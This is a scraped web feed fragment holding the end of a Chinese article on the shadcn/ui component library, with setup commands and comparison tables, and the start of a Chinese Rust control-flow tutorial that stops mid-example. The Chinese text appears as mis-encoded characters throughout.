          <span class="hljs-attr">buttonVariants</span>({ <span class="hljs-attr">variant</span>, <span class="hljs-attr">size</span>, <span class="hljs-attr">className</span> }),
          // <span class="hljs-attr">ç›´æ¥åœ¨è¿™é‡Œæ·»åŠ ä½ çš„æ¸å˜æ•ˆæœ</span>
          "<span class="hljs-attr">hover:bg-gradient-to-r</span> <span class="hljs-attr">hover:from-blue-500</span> <span class="hljs-attr">hover:to-purple-600</span>"
        )}
        <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span>
        {<span class="hljs-attr">...props</span>}
      /&gt;</span></span>
    )
  }
)
</code></pre>
<h3 data-id="heading-3">2. AIç¼–ç¨‹çš„æœ€ä½³æ­æ¡£</h3>
<p>åœ¨AIç¼–ç åŠ©æ‰‹æ™®åŠçš„ä»Šå¤©ï¼Œshadcn/uiçš„è®¾è®¡ç†å¿µæ˜¾å¾—å°¤ä¸ºå‰ç»ï¼š</p>
<ul>
<li><strong>ä¼ ç»Ÿç»„ä»¶åº“çš„é—®é¢˜</strong>ï¼šAIæ— æ³•â€œçœ‹åˆ°â€<code>node_modules</code>ä¸­çš„ç»„ä»¶å®ç°ï¼Œåªèƒ½åŸºäºæœ‰é™çš„æ–‡æ¡£ç»™å‡ºå»ºè®®ã€‚</li>
<li><strong>shadcn/uiçš„ä¼˜åŠ¿</strong>ï¼šAIå¯ä»¥<strong>ç›´æ¥é˜…è¯»ã€ç†è§£å’Œä¿®æ”¹</strong>ä½ é¡¹ç›®ä¸­çš„ç»„ä»¶æºç ã€‚ä½ å¯ä»¥ç›´æ¥è¯´ï¼šâ€œå¸®æˆ‘æŠŠè¿™ä¸ªå¯¹è¯æ¡†çš„åŠ¨ç”»æ—¶é—´ä»300msæ”¹ä¸º200msâ€ï¼ŒAIä¼šç²¾å‡†åœ°æ‰¾åˆ°å¹¶ä¿®æ”¹å¯¹åº”çš„ä»£ç è¡Œã€‚</li>
</ul>
<h3 data-id="heading-4">3. æŒ‰éœ€å¼•å…¥ï¼Œæè‡´è½»é‡</h3>
<p>ä¼ ç»ŸUIåº“å¸¸å¸¸æœ‰â€œå…¨é‡å¼•å…¥â€çš„é—®é¢˜ï¼Œå³ä½¿ä½ åªç”¨äº†ä¸€ä¸ªæŒ‰é’®ï¼Œä¹Ÿå¯èƒ½æ‰“åŒ…è¿›æ•´ä¸ªåº“çš„åŸºç¡€æ ·å¼ã€‚</p>
<p><strong>shadcn/uiçš„è§£å†³æ–¹æ¡ˆ</strong>ï¼šåªæ·»åŠ ä½ çœŸæ­£éœ€è¦çš„ç»„ä»¶ã€‚æ¯ä¸ªç»„ä»¶éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰éšè—çš„ä¾èµ–ã€‚</p>

























<table><thead><tr><th align="left">ç»„ä»¶</th><th align="left">æ–‡ä»¶å¤§å°</th><th align="left">ä¾èµ–å…³ç³»</th></tr></thead><tbody><tr><td align="left">Button</td><td align="left">~5KB</td><td align="left">é›¶è¿è¡Œæ—¶ä¾èµ–</td></tr><tr><td align="left">Dialog</td><td align="left">~8KB</td><td align="left">ä»…ä¾èµ–Radix UI</td></tr><tr><td align="left">Data Table</td><td align="left">~15KB</td><td align="left">ä¾èµ–TanStack Table</td></tr></tbody></table>
<h2 data-id="heading-5">ä¸‰ã€æŠ€æœ¯æ¶æ„ï¼šç°ä»£å‰ç«¯æŠ€æœ¯æ ˆçš„é›†å¤§æˆè€…</h2>
<ul>
<li><strong>åŸºäº Radix UI çš„æ— éšœç¢åŸºç¡€</strong>ï¼šæ‰€æœ‰äº¤äº’ç»„ä»¶ï¼ˆå¦‚å¯¹è¯æ¡†ã€ä¸‹æ‹‰èœå•ï¼‰éƒ½åŸºäº Radix UI æ„å»ºï¼Œæä¾›å¼€ç®±å³ç”¨çš„é”®ç›˜å¯¼èˆªã€å®Œæ•´çš„å±å¹•é˜…è¯»å™¨å…¼å®¹æ€§ï¼Œå¹¶éµå¾ªWAI-ARIAæ ‡å‡†ã€‚</li>
<li><strong>æ·±åº¦é›†æˆ Tailwind CSS</strong>ï¼šæ ·å¼ç³»ç»Ÿå®Œå…¨åŸºäºTailwind CSSï¼Œä¿è¯äº†è®¾è®¡çš„ä¸€è‡´æ€§ã€å¯ç»´æŠ¤æ€§ï¼Œå¹¶æå‡äº†å¼€å‘æ•ˆç‡ã€‚</li>
<li><strong>TypeScript ä¼˜å…ˆ</strong>ï¼šæ‰€æœ‰ç»„ä»¶éƒ½ä½¿ç”¨TypeScriptç¼–å†™ï¼Œæä¾›å®Œæ•´çš„ç±»å‹å®‰å…¨ã€æ™ºèƒ½çš„IDEè‡ªåŠ¨è¡¥å…¨å’Œè‡ªæ–‡æ¡£åŒ–çš„Propsæ¥å£ã€‚</li>
</ul>
<h2 data-id="heading-6">å››ã€å®æˆ˜æŒ‡å—ï¼šäº”åˆ†é’Ÿå¿«é€Ÿä¸Šæ‰‹</h2>
<h3 data-id="heading-7">ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé¡¹ç›®</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨Next.jsï¼ˆæ¨èï¼‰</span>
npx create-next-app@latest my-app --typescript --tailwind --app
<span class="hljs-built_in">cd</span> my-app
</code></pre>
<h3 data-id="heading-8">ç¬¬äºŒæ­¥ï¼šåˆå§‹åŒ– shadcn/ui</h3>
<pre><code class="hljs language-bash" lang="bash">npx shadcn-ui@latest init
</code></pre>
<p>CLIä¼šå¼•å¯¼ä½ å®Œæˆé…ç½®ï¼šé€‰æ‹©æ ·å¼ç³»ç»Ÿã€é…ç½®ä¸»é¢˜é¢œè‰²ã€è®¾ç½®ç»„ä»¶ç›®å½•ä½ç½®ã€‚</p>
<h3 data-id="heading-9">ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ä½ çš„ç¬¬ä¸€ä¸ªç»„ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ·»åŠ ä¸€ä¸ªæŒ‰é’®</span>
npx shadcn-ui@latest add button
<span class="hljs-comment"># æ·»åŠ ä¸€ä¸ªå¡ç‰‡</span>
npx shadcn-ui@latest add card
<span class="hljs-comment"># æ·»åŠ ä¸€ä¸ªå¯¹è¯æ¡†</span>
npx shadcn-ui@latest add dialog
</code></pre>
<h3 data-id="heading-10">ç¬¬å››æ­¥ï¼šç«‹å³ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åœ¨app/page.tsxä¸­</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/components/ui/button"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-8"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"default"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"lg"</span>&gt;</span>
        è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªshadcn/uiæŒ‰é’®
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h2 data-id="heading-11">äº”ã€è€ƒè™‘ä¸æƒè¡¡ï¼šå®ƒé€‚åˆä½ çš„é¡¹ç›®å—ï¼Ÿ</h2>
<h3 data-id="heading-12">é€‚åˆçš„åœºæ™¯ï¼š</h3>
<ul>
<li>éœ€è¦<strong>é«˜åº¦å®šåˆ¶UI</strong>çš„å“ç‰Œåº”ç”¨</li>
<li><strong>é•¿æœŸç»´æŠ¤</strong>çš„å¤§å‹é¡¹ç›®</li>
<li>å¯¹<strong>æ— éšœç¢è®¿é—®</strong>æœ‰è¦æ±‚çš„äº§å“</li>
<li>ä½¿ç”¨<strong>AIç¼–ç¨‹åŠ©æ‰‹</strong>çš„å¼€å‘å›¢é˜Ÿ</li>
<li>è¿½æ±‚<strong>æè‡´æ€§èƒ½</strong>å’ŒåŒ…ä½“ç§¯ä¼˜åŒ–çš„åº”ç”¨</li>
</ul>
<h3 data-id="heading-13">éœ€è¦è€ƒè™‘çš„ç‚¹ï¼š</h3>
<ul>
<li><strong>æ›´æ–°ç»´æŠ¤</strong>ï¼šå½“å®˜æ–¹å‘å¸ƒæ›´æ–°æ—¶ï¼Œä½ éœ€è¦æ‰‹åŠ¨åˆå¹¶åˆ°é¡¹ç›®ä¸­</li>
<li><strong>è®¾è®¡è´£ä»»</strong>ï¼šæ›´å¤šçš„è‡ªç”±ä¹Ÿæ„å‘³ç€æ›´å¤šçš„è®¾è®¡å†³ç­–</li>
<li><strong>å›¢é˜Ÿå­¦ä¹ </strong>ï¼šéœ€è¦ç†Ÿæ‚‰TypeScriptå’ŒTailwind CSS</li>
</ul>
<h3 data-id="heading-14">ä¸ä¼ ç»ŸUIåº“çš„å¯¹æ¯”ï¼š</h3>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ä¼ ç»ŸUIåº“ (å¦‚MUI)</th><th align="left">shadcn/ui</th></tr></thead><tbody><tr><td align="left"><strong>ä»£ç æ‰€æœ‰æƒ</strong></td><td align="left">ä½¿ç”¨æ–¹ï¼Œä¸å¯ä¿®æ”¹æºç </td><td align="left">å®Œå…¨æ‹¥æœ‰ï¼Œå¯ä»»æ„ä¿®æ”¹</td></tr><tr><td align="left"><strong>å®šåˆ¶æ–¹å¼</strong></td><td align="left">é€šè¿‡ä¸»é¢˜é…ç½®å’ŒCSSè¦†ç›–</td><td align="left">ç›´æ¥ä¿®æ”¹ç»„ä»¶æºç </td></tr><tr><td align="left"><strong>åŒ…å¤§å°</strong></td><td align="left">é€šå¸¸è¾ƒå¤§ï¼ˆå³ä½¿æŒ‰éœ€å¯¼å…¥ï¼‰</td><td align="left">åªåŒ…å«å®é™…ä½¿ç”¨çš„ç»„ä»¶</td></tr><tr><td align="left"><strong>å­¦ä¹ æ›²çº¿</strong></td><td align="left">å­¦ä¹ åº“ç‰¹å®šçš„APIå’Œä¸»é¢˜ç³»ç»Ÿ</td><td align="left">å­¦ä¹ å®é™…çš„React/Tailwindä»£ç </td></tr><tr><td align="left"><strong>AIå‹å¥½åº¦</strong></td><td align="left">è¾ƒå·®ï¼ˆAIçœ‹ä¸åˆ°å®ç°ï¼‰</td><td align="left">æä½³ï¼ˆAIå¯ç›´æ¥æ“ä½œæºç ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-15">ä¸ƒã€ç¤¾åŒºç”Ÿæ€ï¼šä¸åªæ˜¯React</h2>
<p>è™½ç„¶æœ€å‡ºåçš„æ˜¯Reactç‰ˆæœ¬ï¼Œä½†shadcn/uiçš„ç†å¿µå·²ç»æ‰©å±•åˆ°å…¶ä»–æ¡†æ¶ã€‚ç¤¾åŒºç»´æŠ¤äº†  Vue 3ç‰ˆæœ¬ (shadcn-vue)ï¼Œæä¾›ç›¸ä¼¼çš„å¼€å‘ä½“éªŒã€‚åŒæ—¶ï¼Œç¤¾åŒºä¹Ÿè´¡çŒ®äº†å¤šç§å¼€ç®±å³ç”¨çš„æ¨¡æ¿ï¼Œå¦‚ä»ªè¡¨ç›˜æ¨¡æ¿ã€ç™»å½•/æ³¨å†Œé¡µé¢ã€ç”µå•†ç»„ä»¶ç­‰ã€‚</p>
<hr/>
<h2 data-id="heading-16">å†™åœ¨æœ€å</h2>
<p>shadcn/ui çš„å‡ºç°ï¼Œå›åº”äº†å‰ç«¯å¼€å‘ä¸­ä¸€ä¸ªé•¿æœŸè¢«å¿½è§†çš„éœ€æ±‚ï¼š<strong>å¼€å‘è€…å¯¹UIç»„ä»¶çš„å®Œå…¨æ§åˆ¶æƒ</strong>ã€‚å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªå·¥å…·é›†åˆï¼Œæ›´æ˜¯ä¸€ç§å¼€å‘å“²å­¦çš„ä½“ç°â€”â€”ç›¸ä¿¡å¼€å‘è€…æœ‰èƒ½åŠ›ã€ä¹Ÿåº”è¯¥æœ‰æƒåˆ©ç›´æ¥æ§åˆ¶ä»–ä»¬æ‰€ä½¿ç”¨çš„æ¯ä¸€ä¸ªç»„ä»¶ã€‚</p>
<p>æ¯•ç«Ÿï¼Œåœ¨è¿™ä¸ªå¼ºè°ƒâ€œå¼€å‘è€…ä½“éªŒâ€çš„æ—¶ä»£ï¼Œè¿˜æœ‰ä»€ä¹ˆæ¯”â€œè¿™ä»£ç å®Œå…¨å±äºæˆ‘â€æ›´å¥½çš„ä½“éªŒå‘¢ï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯éƒ½èƒ½çœ‹æ‡‚çš„Rustå…¥é—¨æ•™ç¨‹ï¼ˆä¸‰ï¼‰â€”â€”æ§åˆ¶æµè¯­å¥]]></title>    <link>https://juejin.cn/post/7604301929120759817</link>    <guid>https://juejin.cn/post/7604301929120759817</guid>    <pubDate>2026-02-09T07:53:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604301929120759817" data-draft-id="7603160727717216307" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯éƒ½èƒ½çœ‹æ‡‚çš„Rustå…¥é—¨æ•™ç¨‹ï¼ˆä¸‰ï¼‰â€”â€”æ§åˆ¶æµè¯­å¥"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,Rust"/> <meta itemprop="datePublished" content="2026-02-09T07:53:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¸ƒåˆ—ç‘Ÿå†œçš„æ˜Ÿç©º"/> <meta itemprop="url" content="https://juejin.cn/user/976022056218471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯éƒ½èƒ½çœ‹æ‡‚çš„Rustå…¥é—¨æ•™ç¨‹ï¼ˆä¸‰ï¼‰â€”â€”æ§åˆ¶æµè¯­å¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022056218471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¸ƒåˆ—ç‘Ÿå†œçš„æ˜Ÿç©º
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:53:39.000Z" title="Mon Feb 09 2026 07:53:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬èŠ‚å­¦ä¹ Rustä¸­çš„æ§åˆ¶æµè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å¾ªç¯/æ¡ä»¶/æ¨¡å¼åŒ¹é…ã€‚</p>
<p>Rustä¸­æ²¡æœ‰jsæˆ–javaä¸­çš„forå¾ªç¯ï¼Œæ²¡æœ‰ä¸‰ç›®è¡¨è¾¾å¼ï¼Œä¹Ÿæ²¡æœ‰switch-caseï¼Œtry-catchè¯­å¥ï¼Œè¿™ä¸€ç‚¹å¯èƒ½æ˜¯åˆšå†™Rustæœ€ä¸ä¹ æƒ¯çš„åœ°æ–¹ã€‚</p>
<h2 data-id="heading-0">if</h2>
<h3 data-id="heading-1">åŸºæœ¬ç”¨æ³•</h3>
<p>å’Œjsæˆ–javaç±»ä¼¼ï¼Œ<strong>ä½†æ˜¯æ¡ä»¶åˆ¤æ–­ä¸ç”¨åŠ æ‹¬å·</strong>â€”â€”åœ¨Rustä¸­æ‹¬å·æ˜¯å•å…ƒç±»å‹ï¼Œç”¨åœ¨ç‰¹æ®Šåœ°æ–¹ï¼Œå› æ­¤å¾ˆå¤šjsä¸­éœ€è¦åŠ æ‹¬å·çš„åœ°æ–¹ï¼ŒRustä¸­éƒ½ä¸ç”¨ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">number</span> = <span class="hljs-number">7</span>;
<span class="hljs-keyword">if</span> number &lt; <span class="hljs-number">0</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"è´Ÿæ•°"</span>);
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> number == <span class="hljs-number">0</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é›¶"</span>);
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> number &lt; <span class="hljs-number">10</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ä¸€ä½æ­£æ•°"</span>);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ä¸¤ä½æ•°æˆ–æ›´å¤§"</span>);
}
</code></pre>
<h3 data-id="heading-2">let if</h3>
<p><strong>åœ¨Rustä¸­ï¼Œè¯­å¥ï¼ˆStatementï¼‰æ˜¯æ‰§è¡Œä¸€äº›æ“ä½œä½†ä¸è¿”å›å€¼çš„æŒ‡ä»¤ï¼Œè€Œè¡¨è¾¾å¼ï¼ˆExpressionï¼‰è®¡ç®—å¹¶è¿”å›ä¸€ä¸ªå€¼ã€‚Rustä¸­å¤§éƒ¨åˆ†æ§åˆ¶æµç»“æ„éƒ½æ˜¯è¡¨è¾¾å¼ï¼Œå¯ä»¥è¿”å›å€¼ã€‚</strong> è¿™ä½¿å¾—ä»£ç æ›´ç®€æ´ï¼Œè¡¨è¾¾èƒ½åŠ›æ›´å¼ºã€‚åŒæ—¶ï¼ŒRustçš„æ¨¡å¼åŒ¹é…éå¸¸å¼ºå¤§ï¼Œå¯ä»¥å¤„ç†å„ç§å¤æ‚çš„æ•°æ®ç»“æ„ã€‚</p>
<p>è¿™é‡Œå¯ä½¿ç”¨<code>let</code>ç›´æ¥è·å–ifè¡¨è¾¾å¼çš„è¿”å›ç»“æœ</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å¯ä»¥ä½¿ç”¨å—è¡¨è¾¾å¼</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">description</span> = <span class="hljs-keyword">if</span> score &gt;= <span class="hljs-number">60</span> {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">message</span> = <span class="hljs-built_in">format!</span>(<span class="hljs-string">"åŠæ ¼ï¼Œåˆ†æ•°æ˜¯ {}"</span>, score);
    message <span class="hljs-comment">// è¿”å›å­—ç¬¦ä¸²</span>
} <span class="hljs-keyword">else</span> {
    <span class="hljs-string">"ä¸åŠæ ¼"</span>.<span class="hljs-title function_ invoke__">to_string</span>()
};
<span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, description);
</code></pre>
<h2 data-id="heading-3">å¾ªç¯</h2>
<p>Rustä¸­çš„å¾ªç¯è¯­å¥æœ‰ä¸‰ç§ï¼šloop,whileå’Œfor</p>
<h3 data-id="heading-4">loop-æ— é™å¾ªç¯</h3>
<p>loopæ˜¯æ— é™å¾ªç¯ï¼Œç”¨breakè·³å‡ºã€‚</p>
<h4 data-id="heading-5">åŸºæœ¬ç”¨æ³•</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">count</span> = <span class="hljs-number">0</span>;

        <span class="hljs-comment">// æ— é™å¾ªç¯</span>
        <span class="hljs-keyword">loop</span> {
            count += <span class="hljs-number">1</span>;
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å¾ªç¯æ¬¡æ•°: {}"</span>, count);
            <span class="hljs-comment">// è·³è¿‡æŸäº›è¿­ä»£</span>
            <span class="hljs-keyword">if</span> count % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> {
                <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// è·³è¿‡å¶æ•°</span>
            }
            <span class="hljs-keyword">if</span> count &gt;= <span class="hljs-number">5</span> {
                <span class="hljs-keyword">break</span>; <span class="hljs-comment">// é€€å‡ºå¾ªç¯</span>
            }
        }
   

</code></pre>
<h4 data-id="heading-6">let loop</h4>
<pre><code class="hljs language-rust" lang="rust"> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span> = <span class="hljs-keyword">loop</span> {
    count += <span class="hljs-number">1</span>;

    <span class="hljs-keyword">if</span> count == <span class="hljs-number">10</span> {
        <span class="hljs-keyword">break</span> count * <span class="hljs-number">2</span>; <span class="hljs-comment">// å¾ªç¯å¯ä»¥è¿”å›å€¼</span>
    }
};
<span class="hljs-built_in">println!</span>(<span class="hljs-string">"ç»“æœæ˜¯: {}"</span>, result); <span class="hljs-comment">// 20</span>
</code></pre>
<h4 data-id="heading-7">åµŒå¥—å¾ªç¯å’Œæ ‡ç­¾</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// åµŒå¥—å¾ªç¯å’Œæ ‡ç­¾</span>
<span class="hljs-symbol">'outer</span>: <span class="hljs-keyword">loop</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"è¿›å…¥å¤–å±‚å¾ªç¯"</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">inner_count</span> = <span class="hljs-number">0</span>;

    <span class="hljs-keyword">loop</span> {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å†…å±‚å¾ªç¯: {}"</span>, inner_count);
        inner_count += <span class="hljs-number">1</span>;

        <span class="hljs-keyword">if</span> inner_count &gt;= <span class="hljs-number">3</span> {
            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// åªé€€å‡ºå†…å±‚å¾ªç¯</span>
        }

        <span class="hljs-keyword">if</span> inner_count == <span class="hljs-number">2</span> {
            <span class="hljs-keyword">break</span> <span class="hljs-symbol">'outer</span>; <span class="hljs-comment">// é€€å‡ºå¸¦æ ‡ç­¾çš„å¤–å±‚å¾ªç¯</span>
        }
    }

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"è¿™è¡Œä¸ä¼šæ‰§è¡Œ"</span>);
}
</code></pre>
<h3 data-id="heading-8">while-æ¡ä»¶å¾ªç¯</h3>
<p>whileç±»ä¼¼jsä¸­çš„while-doè¯­å¥ï¼Œä¸è¿‡æ›´ç®€å•ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"> <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">number</span> = <span class="hljs-number">3</span>;

<span class="hljs-comment">// åŸºæœ¬ while å¾ªç¯</span>
<span class="hljs-keyword">while</span> number != <span class="hljs-number">0</span> {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å€’è®¡æ—¶: {}"</span>, number);
    number -= <span class="hljs-number">1</span>; 
}
<span class="hljs-built_in">println!</span>(<span class="hljs-string">"å‘å°„!"</span>);
</code></pre>
<h3 data-id="heading-9">forå¾ªç¯</h3>
<p><strong>Rustä¸­æ²¡æœ‰ç±»ä¼¼i++çš„è¯­æ³•ï¼Œæ— æ³•ä½¿ç”¨Cé£æ ¼çš„ä¸‰è¡¨è¾¾å¼forå¾ªç¯</strong>ã€‚Rustä¸­çš„forå¾ªç¯ç±»ä¼¼jsä¸­çš„<code>for in</code></p>
<h4 data-id="heading-10">1. éå†Range</h4>
<pre><code class="hljs language-rust" lang="rust">    <span class="hljs-comment">// 1. éå†èŒƒå›´ (Range)</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"èŒƒå›´ 0..5:"</span>);
